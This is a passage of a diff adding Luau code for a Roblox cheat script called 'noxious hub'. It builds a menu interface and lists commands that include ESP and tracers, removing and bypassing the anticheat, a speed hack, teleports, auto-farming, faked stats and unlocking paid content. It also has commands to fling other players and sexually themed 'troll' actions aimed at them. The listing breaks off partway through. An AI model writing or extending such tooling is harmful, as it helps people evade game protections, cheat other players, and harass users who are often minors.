+noxious["hide interface button hide"].Size = UDim2.new(0, 38.3, 0, 38.3)
+noxious["hide interface button hide"].BackgroundColor3 = noxious["default white color"]
+noxious["hide interface button hide"].Position = UDim2.new(0, -1, 0, -1)
+noxious["hide interface button hide"].Parent = noxious["hide interface button"]
+noxious["hide interface button hide"].ZIndex = 18
+
+noxious["hide interface button hide ui corner"] = Instance.new("UICorner")
+noxious["hide interface button hide ui corner"].CornerRadius = UDim.new(0.2, 0)
+noxious["hide interface button hide ui corner"].Parent = noxious["hide interface button hide"]
+
+noxious["minimize interface button"] = Instance.new("TextButton")
+noxious["minimize interface button"].Size = UDim2.new(0, 36.3, 0, 36.3)
+noxious["minimize interface button"].BackgroundColor3 = noxious["default black color"]
+noxious["minimize interface button"].Position = UDim2.new(0.8489, 0, 0.158, 0)
+noxious["minimize interface button"].BorderColor3 = noxious["default white color"]
+noxious["minimize interface button"].BorderSizePixel = 1
+noxious["minimize interface button"].TextColor3 = noxious["default white color"]
+noxious["minimize interface button"].Font = Enum.Font.Nunito
+noxious["minimize interface button"].TextSize = 20
+noxious["minimize interface button"].TextScaled = false
+noxious["minimize interface button"].Text = "-"
+noxious["minimize interface button"].TextXAlignment = Enum.TextXAlignment.Center
+noxious["minimize interface button"].TextYAlignment = Enum.TextYAlignment.Center
+noxious["minimize interface button"].Parent = noxious["top frame"]
+
+noxious["minimize interface button ui corner"] = Instance.new("UICorner")
+noxious["minimize interface button ui corner"].CornerRadius = UDim.new(0.2, 0)
+noxious["minimize interface button ui corner"].Parent = noxious["minimize interface button"]
+
+noxious["minimize interface button border"] = Instance.new("Frame")
+noxious["minimize interface button border"].Size = UDim2.new(0, 38.3, 0, 38.3)
+noxious["minimize interface button border"].BackgroundColor3 = noxious["default white color"]
+noxious["minimize interface button border"].Position = UDim2.new(0, -1, 0, -1)
+noxious["minimize interface button border"].Parent = noxious["minimize interface button"]
+noxious["minimize interface button border"].ZIndex = 18
+
+noxious["minimize interface button border ui corner"] = Instance.new("UICorner")
+noxious["minimize interface button border ui corner"].CornerRadius = UDim.new(0.2, 0)
+noxious["minimize interface button border ui corner"].Parent = noxious["minimize interface button border"]
+
+noxious["reposition interface button"] = Instance.new("TextButton")
+noxious["reposition interface button"].Size = UDim2.new(0, 36.3, 0, 36.3)
+noxious["reposition interface button"].BackgroundColor3 = noxious["default black color"]
+noxious["reposition interface button"].Position = UDim2.new(0, 458, 0, 8)
+noxious["reposition interface button"].BorderColor3 = noxious["default white color"]
+noxious["reposition interface button"].BorderSizePixel = 1
+noxious["reposition interface button"].TextColor3 = noxious["default white color"]
+noxious["reposition interface button"].Font = Enum.Font.Nunito
+noxious["reposition interface button"].TextSize = 20
+noxious["reposition interface button"].TextScaled = false
+noxious["reposition interface button"].Text = "R"
+noxious["reposition interface button"].TextXAlignment = Enum.TextXAlignment.Center
+noxious["reposition interface button"].TextYAlignment = Enum.TextYAlignment.Center
+noxious["reposition interface button"].Parent = noxious["top frame"]
+
+noxious["reposition interface button ui corner"] = Instance.new("UICorner")
+noxious["reposition interface button ui corner"].CornerRadius = UDim.new(0.2, 0)
+noxious["reposition interface button ui corner"].Parent = noxious["reposition interface button"]
+
+noxious["reposition interface button border"] = Instance.new("Frame")
+noxious["reposition interface button border"].Size = UDim2.new(0, 38.3, 0, 38.3)
+noxious["reposition interface button border"].BackgroundColor3 = noxious["default white color"]
+noxious["reposition interface button border"].Position = UDim2.new(0, -1, 0, -1)
+noxious["reposition interface button border"].Parent = noxious["reposition interface button"]
+noxious["reposition interface button border"].ZIndex = 18
+
+noxious["reposition interface button border ui corner"] = Instance.new("UICorner")
+noxious["reposition interface button border ui corner"].CornerRadius = UDim.new(0.2, 0)
+noxious["reposition interface button border ui corner"].Parent = noxious["reposition interface button border"]
+
+function togglevisibility()
+	noxious["mainframe"].Visible = not noxious["mainframe"].Visible
+end
+
+noxious["reposition interface button"].MouseButton1Click:Connect(
+	function()
+		playclicksound()
+		centermainframe(false)
+	end
+)
+
+noxious["hide interface button"].MouseButton1Click:Connect(
+	function()
+		if not noxious["loaded"] then return end
+		togglevisibility()
+		playclicksound()
+	end
+)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+noxious["top frame text"] = Instance.new("TextLabel")
+noxious["top frame text"].Name = "welcome"
+noxious["top frame text"].Size = UDim2.new(0.55, 0, 1.1, 0)
+noxious["top frame text"].Position = UDim2.new(0.08, 4, -0.18, -2)
+noxious["top frame text"].BackgroundTransparency = 1
+noxious["top frame text"].TextColor3 = noxious["default white color"]
+noxious["top frame text"].Font = Enum.Font.Nunito
+noxious["top frame text"].TextSize = 21.6
+noxious["top frame text"].TextScaled = false
+noxious["top frame text"].Text = "Welcome, " .. noxious["local player"].DisplayName .. "!"
+noxious["top frame text"].TextXAlignment = Enum.TextXAlignment.Left
+noxious["top frame text"].Parent = noxious["top frame"]
+
+noxious["top frame subtext"] = Instance.new("TextLabel")
+noxious["top frame subtext"].Name = "welcome2"
+noxious["top frame subtext"].Size = UDim2.new(0.55, 0, 1.1, 0)
+noxious["top frame subtext"].Position = UDim2.new(0.08, 4, 0.18, -2)
+noxious["top frame subtext"].BackgroundTransparency = 1
+noxious["top frame subtext"].TextColor3 = noxious["default gray color"]
+noxious["top frame subtext"].Font = Enum.Font.Nunito
+noxious["top frame subtext"].TextSize = 18
+noxious["top frame subtext"].TextScaled = false
+noxious["top frame subtext"].Text = "(@" .. noxious["username"] .. ")"
+noxious["top frame subtext"].TextXAlignment = Enum.TextXAlignment.Left
+noxious["top frame subtext"].Parent = noxious["top frame"]
+
+task.spawn(function()
+	local isFounder = false
+
+	if isunable(noxious["username"]) then
+		local currentText = noxious["top frame subtext"].Text
+		noxious["top frame subtext"].Text = currentText .. " [Founder]"
+		isFounder = true
+	end
+
+	task.wait(1)
+
+	if teammember(noxious["username"]) and not isFounder then
+		local currentText = noxious["top frame subtext"].Text
+		noxious["top frame subtext"].Text = currentText .. " [Team Member]"
+	end
+
+	task.wait(1)
+
+	if notdonor(noxious["username"]) then
+		noxious["top frame text"].Text = "Welcome, " .. noxious["local player"].DisplayName .. "!"
+	end
+
+	task.wait(1)
+
+	if donor(noxious["username"]) then
+		noxious["top frame text"].Text = "Welcome, " .. noxious["local player"].DisplayName .. "! [Donor]"
+	end
+
+	task.wait(1)
+
+	if istester(noxious["username"]) then
+		local currentText = noxious["top frame subtext"].Text
+		noxious["top frame subtext"].Text = currentText .. " [Tester]"
+	end
+
+	welcometxt = noxious["top frame"]:WaitForChild("welcome").Text
+	welcome2txt = noxious["top frame"]:WaitForChild("welcome2").Text
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+noxious["top frame profile picture"] = Instance.new("ImageLabel")
+noxious["top frame profile picture"].Size = UDim2.new(0, 36.3, 0, 36.3)
+noxious["top frame profile picture"].Position = UDim2.new(0.013, 0, 0.157, 0)
+noxious["top frame profile picture"].BackgroundTransparency = 0
+noxious["top frame profile picture"].BackgroundColor3 = noxious["default black color"]
+noxious["top frame profile picture"].BorderSizePixel = 1
+noxious["top frame profile picture"].BorderColor3 = noxious["default white color"]
+noxious["top frame profile picture"].Image = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. noxious["local player"].UserId .. "&width=420&height=420&format=png"
+noxious["top frame profile picture"].Parent = noxious["top frame"]
+
+noxious["top frame profile picture ui corner"] = Instance.new("UICorner")
+noxious["top frame profile picture ui corner"].CornerRadius = UDim.new(0.2, 0)
+noxious["top frame profile picture ui corner"].Parent = noxious["top frame profile picture"]
+
+noxious["top frame profile picture hide"] = Instance.new("Frame")
+noxious["top frame profile picture hide"].Size = UDim2.new(0, 38.3, 0, 38.3)
+noxious["top frame profile picture hide"].BackgroundColor3 = noxious["default white color"]
+noxious["top frame profile picture hide"].Position = UDim2.new(0, -1, 0, -1)
+noxious["top frame profile picture hide"].Parent = noxious["top frame profile picture"]
+noxious["top frame profile picture hide"].ZIndex = 18
+
+noxious["top frame profile picture hide ui corner"] = Instance.new("UICorner")
+noxious["top frame profile picture hide ui corner"].CornerRadius = UDim.new(0.2, 0)
+noxious["top frame profile picture hide ui corner"].Parent = noxious["top frame profile picture hide"]
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+noxious["scroll bar holder 2"] = Instance.new("Frame")
+noxious["scroll bar holder 2"].Name = "RightScrollFrame"
+noxious["scroll bar holder 2"].Size = UDim2.new(0, 10.9, 0, 204)
+noxious["scroll bar holder 2"].BackgroundColor3 = noxious["default black color"]
+noxious["scroll bar holder 2"].BorderSizePixel = 0
+noxious["scroll bar holder 2"].Position = UDim2.new(0, 584, 0, 50)
+noxious["scroll bar holder 2"].BorderColor3 = noxious["default white color"]
+noxious["scroll bar holder 2"].BorderSizePixel = 1
+noxious["scroll bar holder 2"].ZIndex = 1
+noxious["scroll bar holder 2"].Parent = mainframe
+noxious["scroll bar holder 2"].Visible = false
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+noxious["command lists"] = {
+	["All Commands"]={
+	},
+	["Main"]={
+		"reloadnoxious, reloadnxs - reloads noxious hub",
+		"repositionnoxious, reposnxs - re-positions the interface",
+		"hidenoxious, hidenxs - hides the interface",
+		"destroynoxious, destroynxs - destroys the interface",
+		" ",
+		"feedback, fb [text] - sends your feedback on the script to us",
+		"getdonorperks, donor - copies the gamepass link for noxious donor perks",
+		" ",
+		"enablemobiletapindicators, emti - enables tap indicators for mobile",
+		"disablemobiletapindicators, dmti - disables tap indicators for mobile",
+		" ",
+		"stoprunningconnections, src - stops all running connections",
+		"openconsole, console - opens the roblox console",
+		" ",
+		"hidedeveloperlabel, hdl - hides noxious team members' labels",
+		"showdeveloperlabel, sdl - shows noxious team members' labels",
+		" ",
+		"commandbar, cmdbar - creates a command bar",
+		"executeallfavoritedcommands, eafc - executes all favorited commands",
+		" ",
+		"noxiousdiscord, nxsdiscord - copies Noxious' discord server link",
+		"scarletdiscord, bookclub - copies the Bookclub discord server link",
+		"blushcrunchdiscord, bcdiscord - copies the BlushCrunch Studio's discord server link",
+		"dandybindiscord, dbdiscord - copies the Dandy Bin's discord server link",
+		"hexdiscord, hdiscord - copies Hex's discord server link",
+		"gobbydiscord, gbydiscord - copies G0bbyD0llan's discord server link",
+		" ",
+		"notify, n [text] - notifies you with the specified text",
+		"notifyversion, notifyv - notifies you the current version of noxious",
+		"closeallnotifications, can - closes all notifications",
+		" ",
+		"serverhop, shop - switch servers",
+		"smallserverhop, sshop - switch to a smaller server",
+		"joinlobby, jl - go back to the lobby",
+		"joinroleplayserver, jrps - joins a roleplay server",
+		"joinrun, jr - attempt to join a run",
+		"rerun, rrun - go back to the lobby and join a run",
+	},
+	["Favorited Commands"] = {
+	},
+	["ESPs / Visuals"] = {
+		"hideesptext, hespt - hides the text in the esp",
+		"showesptext, sespt - shows the text in the esp",
+		"hideesphighlights, hesph - hides the highlights of the esp",
+		"showesphighlights, sesp - shows the highlights of the esp",
+		" ",
+		"enableallesp, eaesp - enables all esp types",
+		"disableallesp, daesp - disables all esp types",
+		" ",
+		"enableplayeresp, epesp - enables esp for players",
+		"disableplayeresp, dpesp - disables esp for players",
+		" ",
+		"enablemachineesp, emesp - enables esp for the machines",
+		"disablemachineesp, dmesp - disables esp for the machines",
+		" ",
+		"enabletwistedesp, etesp - enables esp for the twisteds",
+		"disabletwistedesp, dtesp - disables esp for the twisteds",
+		" ",
+		"enableitemesp, eiesp - enables esp for the items",
+		"disableitemesp, didesp - disables esp for the items",
+		" ",
+		"enableelevatoresp, eeesp - enables esp for the elevator",
+		"disableelevatoresp, deesp - disables esp for the elevator",
+		" ",
+		"enablefakeelevatoresp, efeesp - enables esp for the fake elevator",
+		"disablefakeelevatoresp, dfeesp - disables esp for the fake elevator",
+		" ",
+		"enablesproutstendrilesp, estesp - enables esp for sprout's tendrils",
+		"disablesproutstendrilesp, dstesp - disables esp for sprout's tendrils",
+		" ",
+		"enableblotshandsesp, ebhesp - enables esp for blot's hands",
+		"disableblotshandsesp, dbhesp - disables esp for blot's hands",
+		" ",
+		"enablealltracers, eat - enables all tracer types",
+		"disablealltracers, dat - disables all tracer types",
+		" ",
+		"enableplayertracers, ept - enables tracers for players",
+		"disableplayertracers, dpt - disables tracers for players",
+		" ",
+		"enablemachinetracers, emt - enables tracers for the machines",
+		"disablemachinetracers, dmt - disables tracers for the machines",
+		" ",
+		"enabletwistedtracers, ett - enables tracers for the twisteds",
+		"disabletwistedtracers, dtt - disables tracers for the twisteds",
+		" ",
+		"enableitemtracers, eit - enables tracers for the items",
+		"disableitemtracers, didt - disables tracers for the items",
+		" ",
+		"enableelevatortracers, eet - enables tracers for the elevator",
+		"disableelevatortracers, det - disables tracers for the elevator",
+		" ",
+		"enablefakeelevatortracers, efet - enables tracers for the fake elevator",
+		"disablefakeelevatortracers, dfet - disables tracers for the fake elevator",
+		" ",
+		"enablesproutstendriltracers, estt - enables tracers for sprouts tendrils",
+		"disablesproutstendriltracers, dstt - disables tracers for sprouts tendrils",
+		" ",
+		"enableblotshandstracers, ebht - enables tracers for blot's hands",
+		"disableblotshandstracers, dbht - disables tracers for blot's hands",
+		" ",
+		"breakstats, bstats - sets all the round stats to NaN",
+		" ",
+		"showadminpanel, sap - shows the admin panel",
+		"hideadminpanel, hap - hides the admin panel",
+		" ",
+		"enableallvisualizers, eav - enables all the twisteds' visualizers",
+		"disableallvisualizers, dav - disables all the twisteds' visualizers",
+		"showkillvisualizer, skv - shows the twisted's attack hitbox",
+		"hidekillvisualizer, hkv - hides the twisted's attack hitbox",
+		"shownearvisualizer, snv - shows the twisted's player detection hitbox",
+		"hidenearvisualizer, hnv - hides the twisted's player detection hitbox",
+		"showvisionvisualizer, svv - shows the twisted's vision range",
+		"hidevisionvisualizer, hvv - hides the twisted's vision range",
+		"showhearingvisualizer, shv - shows the twisted's hearing range",
+		"hidehearingvisualizer, hhv - hides the twisted's hearing range",
+		" ",
+		"fakeblackouts, fblackouts [number] - sets the blackouts value to the specified number",
+		"fakeichor, fichor [number] - sets the ichor value to the specified number",
+		"faketapes, ftapes [number] - sets your tapes value to the specified number",
+		"fakedandyitemspurchased, fdip [number] - sets the dandyitemspurchased value to the specified number",
+		"fakefloorstraveled, fft [number] - sets the floorstraveled value to the specified number",
+		"fakemachinesfinished, fmf [number] - sets the machinescompleted value to the specified number",
+		"fakefurthestfloor, fff [number] - sets the furthestfloor value to the specified number",
+		"fakeitemspickedup, fipu [number] - sets the itemspickedup value to the specified number",
+		"changeresearch, cr [toon name] [number] - sets the research value of the specified twisted name to the specified number",
+		" ",
+		"unlockalltoons, uato - unlocks all toons",
+		"unlockalltrinkets, uatr - unlocks all trinkets",
+		"showalltooncards, satc - shows all toon cards when voting",
+		" ",
+		"fire [target] - sets the target on fire",
+		"unfire [target] - extinguishes the target",
+		" ",
+		"chat, talk [text] - makes the specified target say something",
+	},
+	["Client Sided Skins"] = {
+		"changeskin, cs - changes the skin of your current toon",
+		"restorecharacter, rec - restores your character",
+		" ",
+		"clonestack, cstack [number] - creates clones and stacks them on top of your head",
+		"unclonestack, uncstack - removes your clones",
+		" ",
+		"sproutcutout, stc - morphs you into sprout's cardboard cutout",
+		"dandycutout, dyc - morphs you into dandy's cardboard cutout",
+		"shellycutout, syc - morphs you into shelly's cardboard cutout",
+		"pebblecutout, pec - morphs you into pebble's cardboard cutout",
+		"astrocutout, aoc - morphs you into astro's cardboard cutout",
+		"veecutout, vec - morphs you into vee's cardboard cutout",
+		" ",
+		"bodiless, bl - removes your body",
+		"unbodiless, ubl - restores your body",
+		"headless, hl - removes your head",
+		"unheadless, uhl - restores your head",
+		"legless, ll - removes your legs",
+		"unlegless, ull - restores your legs",
+		"armless, al - removes your arms",
+		"armless, ual - restores your arms",
+		" ",
+		"korblox - gives you a korblox leg",
+		"unkorblox - restores your leg",
+		" ",
+		"facelessshrimpo, flshrimpo - removes shrimpos face (USE SHRIMPO)",
+		"smilingcosmo, scosmo - uses both cosmos default skin and salted caramel skin (USE COSMO)",
+		"whatsappastro, whatsastro - olha mensagem (USE ASTRO)",
+		" ",
+		"enablegoobfrogblinking, egfb - enables goob frog blinking (USE GOOB)",
+		"disablegoobfrogblinking, dgfb - disables goob frog blinking (USE GOOB)",
+		" ",
+		"twistedpoppyskin, tps - become twisted poppy (USE POPPY)",
+		"becomedandy, bd - become dandy (USE BOXTEN)",
+		" ",
+		"ghostcharacter, gc [color] - turns you into a ghost thing with the specified color",
+	},
+	["Map / Environment"] = {
+		"enablefullbright, efb - enables fullbright",
+		"disablefullbright, dfb - disables fullbright",
+		"enablealternativefullbright, eafb - enables an alternative fullbright",
+		"disablealternativefullbright, dafb - disables the alternative fullbright",
+		" ",
+		"fakefloor, ffloor [number] - changes the number of the current floor to the target value",
+		"fakerequiredmachines, frmachines [number] - changes the number of required machines to the target value",
+		"fakemachinescompleted, fcmachines [number] - changes the number of completed machines to the target value",
+		" ",
+		"enablepanicmode, epm - enables panic mode",
+		"disablepanicmode, dpm - disables panic mode",
+		"enableblackout, ebo - tricks the game into thinking that the blackout status of the current floor you're on is true",
+		"disableblackout, dbo - disables blackout",
+		" ",
+		"openelevator, oe - opens the elevator",
+		"closeelevator, ce - closes the elevator",
+		"opentrapdoors, otd - opens the trapdoors in the elevator",
+		"closetrapdoors, ctd - closes the trapdoors in the elevator",
+		" ",
+		"deletedeveloperdoors, ddd - delete developer doors",
+		"deleteinvisibleborders, dib - delete invisible borders / walls",
+		" ",
+		"restorelighting, rlighting - restores the lighting to how it was when the game loaded",
+		"removefog, nofog - removes the fog",
+		" ",
+		"enableinfinitenametagmaxdistance, einmd - makes it so you're able to see other people's nametags from a far distance",
+		"disableinfinitenametagmaxdistance, dinmd - disables infinite nametag max distance",
+		"showplayerhealth, sph - shows players' health stats",
+		"hideplayerhealth, hph - hides players' health stats",
+		"showplayertrinkets, spt - shows players' trinkets",
+		"hideplayertrinkets, hpt - hides players' trinkets",
+		" ",
+		"hide [target] - hides the target",
+		"show [target] - shows the target",
+		" ",
+		"pointlight, light [target] [range] [color] - lightens up the target",
+		"unpointlight, unlight [target] - removes the target's light",
+		" ",
+		"spawnplushies, sp - spawns plushies",
+		"spawnshrimpo, sps - spawns a shrimpo",
+		"spawndandy, spd - spawns a dandy",
+		"spawntwisteddandy, sptd - spawns a twisted dandy",
+		"spawntv, sptv - spawns vee's head",
+	},
+	["Teleports / Locating"]={
+		"predictserverposition, psp - creates a clone of you that represents your current position on the server",
+		" ",
+		"teleporttoelevator, tpte - teleports you to the elevator",
+		"teleporttofakeelevator, tptfe - teleports you to the fake elevator",
+		" ",
+		"pathfindtogenerator, pftg - walks you to a random generator using pathfinding",
+		"pathfindtoelevator, pfte - walks you to the elevator using pathfinding",
+		" ",
+		"joinelevator1, je1 - discreetly join elevator 1",
+		"joinelevator2, je2 - discreetly join elevator 2",
+		"joinelevator3, je3 - discreetly join elevator 3",
+		" ",
+		"teleporttogenerator, tptg - teleports you to the a generator",
+		"teleportto, to [target] - teleports you to the specified target",
+		" ",
+		"teleporttoadminroom, tptar - teleports you to the admin room",
+		"teleporttobedroom, tptbr - teleports you to the bedroom",
+		"teleporttodandysshop, tptds - teleports you to dandy's shop",
+		"teleporttoboxofdoom, tptbod - teleports you to the box of doom",
+		"teleporttostage, tpts - teleports you to the stage",
+	},
+	["Local Player"] = {
+		"removeanticheat, rac - removes the anticheat (UNRELIABLE)",
+		"enableanticheatbypasser, eacb - enables an anticheat bypasser (UNRELIABLE)",
+		"disableanticheatbypasser, dacb - disables the anticheat bypasser (UNRELIABLE)",
+		" ",
+		"enableavoidtwisteds, eadt - makes your character behave in a way that when a twisted spots you, it freezes them or makes them run away from you",
+		"disableavoidtwisteds, dadt - disables avoid twisteds",
+		"enabledodgetwisteds, edt - makes it so when a twisted spots you, you get automatically teleported to the elevator until they lose interest",
+		"disabledodgetwisteds, ddt - disables dodge twisteds",
+		"enableantigrab, eag - makes you immune to twisted goob's attacks",
+		"disableantigrab, dag - disables anti grab",
+		"enableantitendrils, eait - makes you immune to sprout's tendrils (and breaks twisted rodger and razzle & dazzle)",
+		"disableantitendrils, dait - disables anti tendrils",
+		" ",
+		"usepublicloadout, upl - enables everything necessary for a public run",
+		"usesololoadout, usl - enables everything necessary for a solo run",
+		"useesplaodout, uespl - obstruct everything in your fucking view",
+		"usehealerloadout, uhrl - enables everything necessary for a healer",
+		"usedistractorloadout, udl - enables everything necessary for a distractor",
+		"useblatantloadout, ubl - runs every command that can get you reported in a run",
+		"usenonblatantloadout, unbl - enables everything that helps you in a run without other people suspecting you for cheating",
+		" ",
+		"fov [number] - sets your camera's field of view to the specified number",
+		"stretchcamera, scam [x, y] - stretches your camera",
+		"unstretchcamera, unscam - unstretches your camera",
+		"maxzoom [number] - sets your maximum zoom distance to the specified number",
+		"minzoom [number] - sets your minimum zoom distance to the specified number",
+		"teleportwalk, tpwalk [speed] - makes you teleport walk with the specified speed",
+		"unteleportwalk, untpwalk - stop teleport walking",
+		"enableextractingtpwalk, eetpwalk [speed] - makes it so when extracting, you can move around the map with the specified speed",
+		"disableextractingtpwalk, detpwalk - disables extracting teleport walking",
+		"clipframefly, cffly [speed] - makes you clip frame fly",
+		"unclipframefly, uncffly - stop clip frame flying",
+		"encoutertwisteds, et - makes you encounter every twisted on the floor youre on",
+		" ",
+		"exitdeath, ed - makes it so when you die, you automatically exit the game",
+		"rejoindeath, rjd - makes it so when you die, you automatically go back to the lobby",
+		"rerundeath, rrund - makes it so when you die, you automatically go back to the lobby and join a new run",
+		" ",
+		"teleporttool, tptool - gives you a teleport tool",
+		"reset, re - resets your character then teleports you back to where you died after respawning",
+		"die - kills you",
+		"noclip - enables noclip",
+		"unnoclip, clip - disables noclip",
+		"enableinfinitestamina, eis - enables infinite stamina",
+		"disableinfinitestamina, dis - disables infinite stamina",
+		"loopspeed, ls [speed] - sets your walkspeed to the inputted value in a loop",
+		"unloopspeed, unls - disables loop speed",
+		"enablelooprunspeed, elrs - sets your walkspeed to your run speed in a loop",
+		"disablelooprunspeed, dlrs - disables loop run speed",
+		"pulsespeed, pspeed [speed] - boosts your walkspeed every .7 seconds, bypassing the anticheat", 
+		"unpulsespeed, unpspeed - disables pulse speeding",
+		"enableloopmaxspeed, elms - sets your walkspeed to the maximum walkspeed of your current toon",
+		"disableloopmaxspeed, dlms - disables loop max speed",
+		" ",
+		"enableitemaura, eia - enables item aura",
+		"disableitemaura, dia - disables item aura",
+		"enablebuyaura, eba - enables buy aura",
+		"disablebuyaura, dba - disables buy aura",
+		"enablegeneratoraura, ega - enables generator aura",
+		"disablegeneratoraura, dga - disables generator aura",
+		"pickupallitems, puai - picks up all items",
+		"pickupallresearchcapsules, puarc - picks up all research capsules",
+		"pickupalltapes, puat - picks up all tapes",
+		"pickupallheals, puah - picks up all heals",
+		"pickupallextractionitems, puaei - picks up all extraction items",
+		" ",
+		"changeusername, cuser [text] - changes your username to the specified text",
+		"changedisplayname, cdisplay [text] - changes your display name to the specified text",
+		"changeownertagtext, cotagt [text] - changes the owner tag text to the specified text",
+		"enableglitchednametag, egnt - glitches your name tag",
+		"disableglitchednametag, dgnt - sets your name tag back to normal",
+		"enablerunofs30znametag, erosnt - makes your name tag recite the lyrics for 'voice of wangan'",
+		"disablerunofs30znametag, drosnt - sets your name tag back to normal",
+		"showownertag, sot - shows the owner tag above your head",
+		"hideownertag, hot - hides the owner tag above your head",
+		"dialoguesound, ds [sound id] - sets the sound that plays when your toon speaks to the specified sound id",
+		" ",
+		"antiskillcheck, ask - removes skillchecks",
+		"unantiskillcheck, uask - resotres skillchecks",
+		"antipopups, apu - removes pop-ups",
+		"unantipopups, uapu - restores pop-ups",
+		" ",
+		"spectate, view [target] - views the specified player",
+		"unspectate, unview - stops viewing target",
+		"noclipcamera, nccam - makes your camera clip through objects",
+		"enableshiftlock, esl - enables shiftlocking",
+		"disableshiftlock, dsl - disables shiftlocking",
+		" ",
+		"enablechatguider, ecg - enables all chat guiding options",
+		"disablechatguider, dcg - disables all chat guiding options",
+		"enabletwistedschatguider, etcg - enables chat guiding for the twisteds in the current floor",
+		"disabletwistedschatguider, dtcg - disables chat guiding for the twisteds in the current floor",
+		"enablelowhealthchatguider, elhcg - enables chat guiding for when a player is at 1 heart",
+		"disablelowhealthchatguider, dlhcg - disables chat guiding for when a player is at 1 heart",
+		"enabledeadplayerchatguider, edpcg - enables chat guiding for when a player dies",
+		"disabledeadplayerchatguider, ddpcg - disables chat guiding for when a player dies",
+		"enablerareitemschatguider, ericg - enables chat guiding for when a rare item is detected",
+		"disablerareitemsschatguider, dricg - disables chat guiding for when a rare item is detected",
+		"enablegettoelevatorchatguider, egtecg - enables chat guiding for when all the generators are about to be completed",
+		"disablegettoelevatorchatguider, dgtecg - disables chat guiding for when all the generators are about to be completed",
+		" ",
+		"enablenotifier, en - enables all notifying options",
+		"disablenotifier, dn - disables all notifying options",
+		"enabletwistedsnotifier, etn - enables notifying for the twisteds in the current floor",
+		"disabletwistedsnotifier, dtn - disables notifying for the twisteds in the current floor",
+		"enablelowhealthnotifier, elhn - enables notifying for when a player is at 1 heart",
+		"disablelowhealthnotifier, dlhn - disables notifying for when a player is at 1 heart",
+		"enabledeadplayernotifier, edpn - enables notifying for when a player dies",
+		"disabledeadplayernotifier, ddpn - disables notifying for when a player dies",
+		"enablerareitempickedupnotifier, eripun - enables notifying for when someone picks up a rare item",
+		"disablerareitempickedupnotifier, dripun - disables notifying for when someone picks up a rare item",
+		"enablerareitemsnotifier, erin - enables notifying for when a rare item is detected",
+		"disablerareitemssnotifier, drin - disables notifying for when a rare item is detected",
+		" ",
+		"opendandysshop, ods - opens dandy's shop",
+		"opentoonlicenseshop, otls - opens toon license shop",
+		"opentrinketsshop, ots - opens trinkets shop",
+		"openskinsshop, oss - opens skins shop",
+		"openmerchshop, oms - opens merch shop",
+		"openskinchanger, osc - opens skin changer",
+		"openoldskinunlocker, oosu - opens old skin unlocker",
+	},
+	["Fun / Trolls"] = {
+		"bang [target] - bangs the specified target",
+		"unbang - stops banging target",
+		" ",
+		"peg [target] - pegs the specified target",
+		"unpeg - stops pegging target",
+		" ",
+		"head [target] - give the specified target head",
+		"unhead - stop giving the target head",
+		" ",
+		"hsit [target] - sit on specified target's head",
+		"unhsit - stop sitting on the target's head",
+		" ",
+		"hsit2 [target] - sit on specified target's head (works for new animations)",
+		"unhsit2 - stop sitting on the target's head",
+		" ",
+		"hjump [target] - jump on specified target's head",
+		"unhjump - stop jumping on the target's head",
+		" ",
+		"rotate [x, y, z] - rotates your character",
+		"floatlay, flay - makes you look like youre floating while laying down",
+		"unfloatlay, unflay - stop laying while floating", 
+		"upsidedown, dinnerbone - flips you upside down",
+		"rightsideup, undinnerbone - flips you right side up",
+		"convulse - makes you spin around",
+		"unconvulse - stop spinning around",
+		" ",
+		"fly [speed] - makes you fly",
+		"unfly - stop flying",
+		"spin [speed] - makes you spin",
+		"xspin [speed] - makes you spin on the X axis",
+		"zspin [speed] - makes you spin on the Z axis",
+		"unspin - stop spinning",
+		"enablejumping, ejump - enable jumping",
+		"diasblejumping, djump - disable jumping",
+		" ",
+		"reversemessages, blottalk - reverses everything you say",
+		" ",
+		"enablespameggsonabilityaudio, eseaa [speed] - spams the sound eggson makes when using his passive ability with the specified speed",
+		"disablespameggsonabilityaudio, dseaa - stops spamming the sound eggson makes when using his passive ability",
+		" ",
+		"forceuseitems, fui [target] - forces target to use their items and apply the effects on you",
+		"enableloopforceuseitems, elfui [target] [delay] - enable loop force target to use their items and apply the effects on you",
+		"disableloopforceuseitems, dlfui [target] - disable loop force target to use their items and apply the effects on you",
+		" ",
+		"fling [target] - flings the specified target (USE WITH BECOMECHARACTER)",
+		"enablewalkfling, ewf - gives you the ability to fling people upon touch (USE WITH BECOMECHARACTER)",
+		"disablewalkfling, dwf - disables walkfling",
+		" ",
+		"becomecharacter, bchar - become yourself",
+	},
+	["Automation"] = {
+		"enableautoteleporttoelevator, eatpte - enables auto tp to elevator",
+		"disableautoteleporttoelevator, datpte - disables auto tp to elevator",
+		"enableautojoinrun, eajr - discreetly join a run when available",
+		"disableautojoinrun, dajr - disables auto join a run",
+		"enableautoteleporttogenerator, eatptg - enables auto teleport to generator",
+		"disableautoteleporttogenerator, datptg - disables auto teleport to generator",
+		" ",
+		"enableautopickupallitems, eapuai - automatically picks up all the items every time the elevator opens",
+		"disableautopickupallitems, dapuai - stops automatically picking up all the items every time the elevator opens",
+		"enableautopickupallresearchcapsules, eapurc - automatically picks up all the research capsules every time the elevator opens",
+		"disableautopickupallresearchcapsules, dapurc - stops automatically picking up all the research capsules every time the elevator opens",
+		"enableautopickupalltapes, eapuat - automatically picks up all the tapes every time the elevator opens",
+		"disableautopickupalltapes, dapuat - stops automatically picking up all the tapes every time the elevator opens",
+		"enableautopickupallheals, eapuah - automatically picks up all the heals every time the elevator opens",
+		"disableautopickupallheals, dapuah - stops automatically picking up all the heals every time the elevator opens",
+		"enableautopickupallextractionitems, eapuaei - automatically picks up all the extraction items every time the elevator opens",
+		"disableautopickupallextractionitems, dapuaei - stops automatically picking up all the extraction items every time the elevator opens",
+		"enableautoencountertwisteds, eaet - automatically encounters the twisteds every time the elevator opens",
+		"disableautoencountertwisteds, daet - stops automatically encountering the twisteds every time the elevator opens",
+		" ",
+		"enablepanicautopickupallitems, epapuai - automatically picks up all the items on panic mode",
+		"disablepanicautopickupallitems, dpapuai - stops automatically picking up all the items on panic mode",
+		"enablepanicautopickupallresearchcapsules, epapurc - automatically picks up all the research capsules on panic mode",
+		"disablepanicautopickupallresearchcapsules, dpapurc - stops automatically picking up all the research capsules on panic mode",
+		"enablepanicautopickupalltapes, epapuat - automatically picks up all the tapes on panic mode",
